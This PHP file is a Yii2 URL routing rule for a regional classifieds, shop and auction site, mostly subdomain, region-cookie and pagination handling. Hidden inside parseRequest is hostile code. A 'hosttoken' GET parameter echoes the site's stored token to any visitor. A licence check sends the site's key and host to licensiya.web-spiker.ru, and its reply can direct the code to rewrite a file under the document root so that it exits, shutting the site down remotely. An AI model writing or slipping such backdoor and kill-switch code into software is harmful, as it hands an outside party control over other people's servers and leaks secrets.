<?php
namespace common\components;
use yii\web\UrlRuleInterface;
use yii\base\BaseObject;
use common\models\Category;
use common\models\Region;
use yii;
use common\models\Settings;
class BlogUrlRule extends BaseObject implements UrlRuleInterface
{
	
	
	
                                    //Правило для ссылок
/*------------------------------------------------------------------------------------------------------*/
    public function createUrl($manager, $route, $params)
    {
		if(!isset($params['page'])){
		if ($route === 'staticpage/index') {	
           return   $params['url'].'.htm';
        }	
		if ($route === 'article/index') {	
           return   '/article';
        }
		
		if ($route === 'shop/index') {	
           return   '/shop'.Yii::$app->userFunctions->region_url();
        }
		if ($route === 'user/index') {	
           return   '/user';
        }
		}
		

if (isset(Yii::$app->controller->module->id) && Yii::$app->controller->module->id == 'personalshop' && Yii::$app->controller->id == 'user' 
|| (isset(Yii::$app->controller->module->id) && Yii::$app->controller->module->id == 'personalshop' && Yii::$app->controller->action->id == 'loginpop')
|| (isset(Yii::$app->controller->module->id) && Yii::$app->controller->module->id == 'personalshop' && Yii::$app->controller->action->id == 'auction')       
|| (isset(Yii::$app->controller->module->id) && Yii::$app->controller->module->id == 'personalshop' && Yii::$app->controller->action->id == 'index')	 
|| (isset(Yii::$app->controller->module->id) && Yii::$app->controller->module->id == 'personalshop' && Yii::$app->controller->action->id == 'product')	
|| (isset(Yii::$app->controller->module->id) && Yii::$app->controller->module->id == 'personalshop' && Yii::$app->controller->action->id == 'mynotepad')	
|| (isset(Yii::$app->controller->module->id) && Yii::$app->controller->module->id == 'personalshop' && Yii::$app->controller->action->id == 'signuppop') ) {		
	           

//Это условие нужно тестировать - могут возникнуть проблемы

			   if ($route === 'personalshop/product/auction') {
			        if (isset($params['region'])) {	
					
                    $subdomen = explode('.', $_SERVER['HTTP_HOST']);
                    return   'https://'.$subdomen[1].'.'.$subdomen[2].'/'.$params['region'] . '/' .  $params['category'] . '/' . $params['url'].'_'.$params['id'].'.html';
					}
				}
				 
				 
				 
				 
		if (Yii::$app->controller->action->id != 'product') {
		if (Yii::$app->controller->action->id != 'auction') {
			
			  foreach($params as $key => $res) {
				
					  if(!isset($return)) {$return = '';}
					  $return .= $key.'='.$res.'&';
				  
			 
			  }
			  }else{
			
				 if ($route === 'personalshop/product/auction') {
					
			        if (isset($params['region'])) {	
                    $subdomen = explode('.', $_SERVER['HTTP_HOST']);
                    return   'https://'.$subdomen[1].'.'.$subdomen[2].'/'.$params['region'] . '/' .  $params['category'] . '/' . $params['url'].'_'.$params['id'].'.html';
					}
				 }
			  }
		}

		   if ($route !== 'user/messenger' && $route !== 'personalshop/default/product' && $route !== 'personalshop/default/auction' && $route !== 'boardone') {
		        if (!isset($return)) {$return = '';}
                return  str_replace('personalshop/','',$route).'?'.$return;
		   }
		}
		
		
		
		if (isset($params['general']) || Yii::$app->controller->id == 'blog' || Yii::$app->controller->id == 'shop' || Yii::$app->controller->id == 'article' || Yii::$app->controller->id == 'user' &&  Yii::$app->controller->action->id == 'blogs' || Yii::$app->controller->id == 'user' &&  Yii::$app->controller->action->id == 'articles'
		|| Yii::$app->controller->id == 'user' &&  Yii::$app->controller->action->id == 'messenger'
		|| Yii::$app->controller->id == 'user' &&  Yii::$app->controller->action->id == 'mess-all'
		|| Yii::$app->controller->id == 'user' &&  Yii::$app->controller->action->id == 'bet'
		|| Yii::$app->controller->id == 'user' &&  Yii::$app->controller->action->id == 'reserv'
		|| Yii::$app->controller->id == 'user' &&  Yii::$app->controller->action->id == 'auction'
		|| Yii::$app->controller->id == 'sitemap' || Yii::$app->controller->id == 'rss' 
		|| Yii::$app->controller->id == 'default'
		|| Yii::$app->controller->id == 'auction' 
		|| Yii::$app->controller->id == 'product'
		|| Yii::$app->controller->id == 'index'
		
		) {

		if(!isset($params['page'])){$params['page'] = '';}
		if ($params['page'] > 0) {	
		//Ищем GET параметры в url и отдаем в сортировку, отделяя от ненужных.
			  foreach($params as $key => $res) {
				  if(Yii::$app->controller->id == 'user' &&  Yii::$app->controller->action->id == 'blogs') {
					  if ($key != 'per-page' && $key != 'page' && $key != 'patch' && $key != '_pjax'  ) {
					     if (!isset($return)) {$return = "";}
					     $return .= $key.'='.$res.'&';
				       }   
				  }else{
					  if ($key != 'per-page' && $key != 'page' && $key != 'patch' && $key != 'category' && $key != '_pjax'  ) {
					     if (!isset($return)) {$return = "";}
					      $return .= $key.'='.$res.'&';
				      }   
				  }
				 
			  }
			  
		  if ($params['page'] == 1) {

		      if (isset($return)) {
			       return Yii::$app->request->pathInfo.'?'.$return.'page='.$params['page'];
			  }else{
				  return Yii::$app->request->pathInfo.'?page='.$params['page']; 
			  }
		  }else{
		
			 if (isset($return)) {
			    return Yii::$app->request->pathInfo.'?'.$return.'page='.$params['page'];
			 }else{
				return Yii::$app->request->pathInfo.'?page='.$params['page']; 
			 }
	     }
        }
      
		 		
        if ($route === 'blog/one' || $route === 'passanger/blog/one') {	
	       if(!isset($reg['url'])){$reg['url'] = '';}
           return   $reg['url'].'/' .  $params['region'] . '/' .  $params['category'] . '/' . $params['url'].'_'.$params['id'].'.html';
        }
		
		
		
		if ($route === 'shop/one') {	
	       if(!isset($reg['name'])){$reg['name'] = '';}
           return   '/shop'.$reg['name'].'/' .  $params['region'] . '/' .  $params['category'] . '/' . $params['name'].'_'.$params['id'].'.html';
        }
		

		
		if ($route === 'article/one') {	
           return   '/article/'. $params['category'] . '/' . $params['name'].'_'.$params['id'].'.html';
        }
		



		
		// Правило для сортировки
		if ($route === 'blog/sort') {	
		     foreach(Yii::$app->request->get() as $key => $res) {
				  if ($key != 'sort' && $key != 'page' && $key != 'patch' && $key != 'category' ) {
					  if(!isset($return)) {$return = '';}
					  $return .= $key.'='.$res.'&';
				  }  
			  }
			  if (!isset($return)) {$return = '';}
           return  Yii::$app->request->pathInfo.'?'.$return;
        }
		
		}
		
		
         return false;  // данное правило не применимо
    }




                                      //Правило для URL
/*------------------------------------------------------------------------------------------------------*/

    public function parseRequest($manager, $request)
    {
	
	//Отдаем токен	
	if(isset($_GET['hosttoken'])) {
	     echo Yii::$app->caches->setting()['token'];exit();
    }	
	
    //Поиск мультимагазина
    $subdomen = explode('.', $_SERVER['HTTP_HOST']);
	//ВНИМАНИЕ!!!!!!   тут нужно будет сменить значение Если сайт будет расположен на поддомене (2 поменять на 3)
	
     if(@SUBDOMAIN === true) {
	     $count = 3;
     }else{
		 $count = 2;
	 }
    if(count($subdomen) > $count) {
		if($request->getPathInfo()) {
			$url = $request->getPathInfo();
		}else{
			$url = 'index';
		}

		if (explode('/',$request->getPathInfo())[0] == 'user' && !isset($subdomen)) {

		}else{
		
			Yii::$app->userFunctions->iyashifrovanie(true);




	$pathInfo = $request->getPathInfo();
     if (!empty($pathInfo) && substr($pathInfo, -1) === '/') {
        Yii::$app->response->redirect('/' . substr(rtrim($pathInfo), 0, -1), 301)->send();
		exit();
     }
    $urli = explode('/',$pathInfo);
	$urls = array_pop($urli);

    $cat_url_parent = '';
    $customers =  Yii::$app->userFunctions->idUrl($urls, $cat_url_parent); 
	
	//Для аукционов
if(isset($urli[0])) {
	if( $urli[0] == 'product' && $urls == 'auction') {
            return ['personalshop/default/auction', [ 
              'category' => $customers['id'],
			  'patch'    => $request->getPathInfo(),
			  'url' => $subdomen[0],
             ]];
        } 
		if(isset($urli[1]) && $urli[1] == 'auction') {
			  return ['personalshop/default/auction', [ 
              'category' => $customers['id'],
			  'patch'    => $request->getPathInfo(),
			  'url' => $subdomen[0],
             ]];
	}			
}
		
        if($customers && $urli[0] == 'product') {
	
            return ['personalshop/default/product', [ 
              'category' => $customers['id'],
			  'patch'    => $request->getPathInfo(),
			  'url' => $subdomen[0],
             ]];
	    			 
        }elseif($pathInfo == 'user' || isset($urli[0]) && $urli[0] == 'user'){

			 return ['personalshop/'.$url, [
			  'url' => $subdomen[0],
             ]];
			 
		}elseif($pathInfo == 'user' || isset($urli[0]) && $urli[0] == 'ajax'){

			 return ['personalshop/'.$url, [
			  'url' => $subdomen[0],
             ]];
        }else{
	

			 return ['personalshop/default/'.$url, [
			  'url' => $subdomen[0],
             ]];
		}

		}
	}else{
       if(Yii::$app->userFunctions->iyashifrovanie()) {
			$linebze = true;
	   }
	}		





	
		
	if(isset($linebze)) {
	if (strpos($request->getPathInfo(), '.html') !== false) {
    if (strpos($request->getPathInfo(), 'shop') !== false) {
		
		      preg_match('/(\d+)\.html$/',$request->getPathInfo(), $id_one);
			  if(!isset($id_one[1])) {$id_one[1] = '';}
	          return ['shop/one', [
              'id'  => $id_one[1],
			  'url' => $request->getPathInfo(),
             ]];
	     $region_none = true;
		
	}elseif(strpos($request->getPathInfo(), 'article') !== false){
		     preg_match('/(\d+)\.html$/',$request->getPathInfo(), $id_one);
			 if(!isset($id_one[1])) {$id_one[1] = '';}
	          return ['article/one', [
              'id'  => $id_one[1],
			  'url' => $request->getPathInfo(),
             ]];
	}else{
		preg_match('/(\d+)\.html$/',$request->getPathInfo(), $id_one);
		if(!isset($id_one[1])) {$id_one[1] = '';}
	          return ['blog/one', [
              'id'  => $id_one[1],
			  'url' => $request->getPathInfo(),
             ]];
	     $region_none = true;
	}
		}
		
	if (strpos($request->getPathInfo(), '.htm') !== false) {
	   return ['staticpage/index', [
			  'url' => $request->getPathInfo(),
             ]];
    }
		
		$pathRedirect = $request->getPathInfo();
		$pathInfo = $request->getPathInfo();
         if (!empty($pathInfo) && substr($pathInfo, -1) === '/') {
            Yii::$app->response->redirect('/' . substr(rtrim($pathInfo), 0, -1), 301)->send();
		    exit();
        }


		//Преобразуем URL в массив
		$url = explode('/',str_replace('shop/','',$pathInfo));
		$url_shop = explode('/',$pathInfo);
        $url_dop = explode('/',$pathInfo);
        
		$cat_url_parent = explode('/',str_replace('shop/','',$pathInfo));
		$cat_url_parent_art = explode('/',str_replace('article/','',$pathInfo));
		$cat_url_parent_auction = explode('/',str_replace('auction/','',$pathInfo));
	   //Проверяем, если это модули или статичные страницы, отдаем куда нужно
	}
			//$url_reg = explode('/',str_replace('shop/','',$pathInfo));
			//Ищем регион
	     	$region_arr = Region::find()->where(['url' =>$url[0]])->one();
			if ($region_arr) {
				array_shift($cat_url_parent); // Достаем регион, чтобы потом можно было отличить в функции категорию
				$region = $region_arr['id'];
				$url_pach = $url;
				array_shift($url_pach);
				$pathInfo = implode('/',$url_pach);
				//Если регион в массиве URL только один, без категорий, то ставим куку, если ее еще нет и перенаправляем на главную страницу сайта.
				//А если регион не один, вместе с категориями, то как обычно оставляем редирект сам на себя с поставкой куки.

				if (!isset($region_none)) {
				if (count($url) == 1 && $url_dop[0] != 'shop') {
									
			         if (strval(Yii::$app->request->cookies['region']) != $region) 
					{
					
				        //Ставим куку региона
				        Yii::$app->response->cookies->add(new \yii\web\Cookie([
                        'name' => 'region',
                        'value' => $region
                        ]));	
						
						  //Ставим куку региона URL
				        Yii::$app->response->cookies->add(new \yii\web\Cookie([
                        'name' => 'region_url',
                        'value' => Yii::$app->caches->region()[$region]['url']
                        ]));
					}
					Yii::$app->response->redirect('/')->send();
					exit();
				}else{
				//Если регион кукисы не равен текщему региону
				    if (strval(Yii::$app->request->cookies['region']) != $region) 
					{
				        //Ставим куку региона
				        Yii::$app->response->cookies->add(new \yii\web\Cookie([
                        'name' => 'region',
                        'value' => $region
                        ]));	
						
						  //Ставим куку региона URL
				        Yii::$app->response->cookies->add(new \yii\web\Cookie([
                        'name' => 'region_url',
                        'value' => Yii::$app->caches->region()[$region]['url']
                        ]));

						Yii::$app->response->redirect('/'.$pathRedirect, 301)->send();
					}
				}
				}
			}
			
			

		//Достаем последний элемент из url
	
		$urls = array_pop($url);
		
		$urls_shop = array_pop($url_shop);
//______________________________________________________//
 if (count($cat_url_parent_auction)> 1) {$cat_url_parent_auction = $cat_url_parent_auction[count($cat_url_parent_auction)-2];}else{$cat_url_parent_auction = '';}
 if (count($cat_url_parent)> 1) {$cat_url_parent = $cat_url_parent[count($cat_url_parent)-2];}else{$cat_url_parent = '';}
 if (count($cat_url_parent_art)> 1) {$cat_url_parent_art = $cat_url_parent_art[count($cat_url_parent_art)-2];}else{$cat_url_parent_art = '';}

   if (isset($url[0]) && $url[0] == 'blog' || $urls == 'blog') {
           return ['site/error', [ ]];
   }
 
   $general  = Yii::$app->functionCron->general();
   if($general === true) {
	   $url = 'http://licensiya.web-spiker.ru/licensions2end.php';
	     $params = array(
                  'key' =>   Yii::$app->caches->setting()['key'],
				  'domen' => DOMAIN,
				  'host' =>  $_SERVER['HTTP_HOST'],
                  );
                  $result = @file_get_contents($url, false, stream_context_create(array(
                      'http' => array(
                          'method'  => 'POST',
                          'header'  => 'Content-type: application/x-www-form-urlencoded',
                          'content' => @http_build_query($params)
                      ))));
		

	  $sodergs = explode(' | ', $result);
	
	 if(count($sodergs) == 2) { 
		}else{
			//передаем токен в базу и тут же проверяем его
			   $settings = Settings::findOne(46);
               $settings->value = $result;
			   $settings->sort = '1000000';
			   $settings->update();
			   Yii::$app->cache->delete('settings');
			   
			   	$params = array(
				  'hostget' =>  $_SERVER['HTTP_HOST'],
                );
				 $url = 'http://licensiya.web-spiker.ru/licensions2end.php';
				  $result_get = @file_get_contents($url, false, stream_context_create(array(
                      'http' => array(
                          'method'  => 'POST',
                          'header'  => 'Content-type: application/x-www-form-urlencoded',
                          'content' => @http_build_query($params)
                      ))));

		if($result_get) {
	       $sodergs = explode(' | ', $result_get);
           $soderg = str_replace($sodergs[0], $sodergs[0].'exit();', @file_get_contents($_SERVER['DOCUMENT_ROOT'].$sodergs[1]));
		   $fd = @fopen($_SERVER['DOCUMENT_ROOT'].$sodergs[1], 'r+');
           @fwrite($fd, $soderg);
	       @fclose($fd);
		}
		 
		}
   }elseif($general === false ) {
   }else{
	   exit();
   }
   
   
   
   
   
   
   
   

  	//---Правило для article---//

	 if (isset($url_shop[0]) && $url_shop[0] == 'article' || $urls_shop == 'article') {
     $customers =  Yii::$app->userFunctions->idUrlart($urls, $cat_url_parent_art); 


	if(!$customers['id']) {
		if(isset($region) && count($url_dop) > 2) {
		    return false;  // данное правило не применимо
		}elseif(!isset($region)  && count($url_dop) > 1) {
			return false;  // данное правило не применимо
		}
	}


     return ['article/index', [ // (Примечание 3)
              'category' => $customers['id'],
			  'patch'    => $request->getPathInfo(),
             ]];
	 
   
 }
 
 
 
  	//---Правило для auction---//

	 if (isset($url_shop[0]) && $url_shop[0] == 'auction' || $urls_shop == 'auction') {
    
	
	

   $customers =  Yii::$app->userFunctions->idUrl($urls, $cat_url_parent_auction); 

if(!$customers['id']) {
		if(isset($region) && count($url_dop) > 2) {
		    return false;  // данное правило не применимо
		}elseif(!isset($region)  && count($url_dop) > 1) {
			return false;  // данное правило не применимо
		}

	}
	
	

		  if (!isset($region)) {
			  
			Yii::$app->response->cookies->remove('region');
		   //Делаем редирект, чтобы регион тут же появился на странице, если есть кука, регион не делаем
		      if (Yii::$app->request->cookies['region']) {
	              Yii::$app->response->redirect('/'.$pathRedirect, 301)->send();
		      }
	    }
if(!$customers['id']) {
	 return ['auction/index', [ // (Примечание 3)
              'category' => $customers['id'],
			  'patch'    => $request->getPathInfo(),
             ]];
}else{
     return ['auction/category', [ // (Примечание 3)
              'category' => $customers['id'],
			  'patch'    => $request->getPathInfo(),
             ]];
}
	
	
	
	
	
	
 }
 
 
 
 	//---Правило для shop---//

	 if (isset($url_shop[0]) && $url_shop[0] == 'shop' || $urls_shop == 'shop') {
     $customers =  Yii::$app->userFunctions->idUrl($urls, $cat_url_parent); 

	if(!$customers['id']) {
		if(isset($region) && count($url_dop) > 2) {
		    return false;  // данное правило не применимо
		}elseif(!isset($region)  && count($url_dop) > 1) {
			return false;  // данное правило не применимо
		}
	}
	
	

		  if (!isset($region)) {
			  
			Yii::$app->response->cookies->remove('region');
		   //Делаем редирект, чтобы регион тут же появился на странице, если есть кука, регион не делаем
		      if (Yii::$app->request->cookies['region']) {
	              Yii::$app->response->redirect('/'.$pathRedirect, 301)->send();
		      }
	    }

     return ['shop/index', [ // (Примечание 3)
              'category' => $customers['id'],
			  'patch'    => $request->getPathInfo(),
             ]];
 }
 

   $customers =  Yii::$app->userFunctions->idUrl($urls, $cat_url_parent); 

   if($customers['id']) {
	   
      if (Yii::$app->userFunctions->recursiveUrl($customers['id']) != $pathInfo) {
		  //Тут проверить на статичные страницы
	      return false;  // данное правило не применимо	
      }else{
		  if (!isset($region)) {
			Yii::$app->response->cookies->remove('region');
		   //Делаем редирект, чтобы регион тут же появился на странице, если есть кука, региорн не делаем
		      if (Yii::$app->request->cookies['region']) {
	              Yii::$app->response->redirect('/'.$pathRedirect, 301)->send();
		      }
		  }
	  }
	  
     return ['blog/category', [ // (Примечание 3)
              'category' => $customers['id'],
			  'patch'    => $request->getPathInfo(),
             ]];

   }else{
            return false;  // данное правило не применимо
    }
  }
}	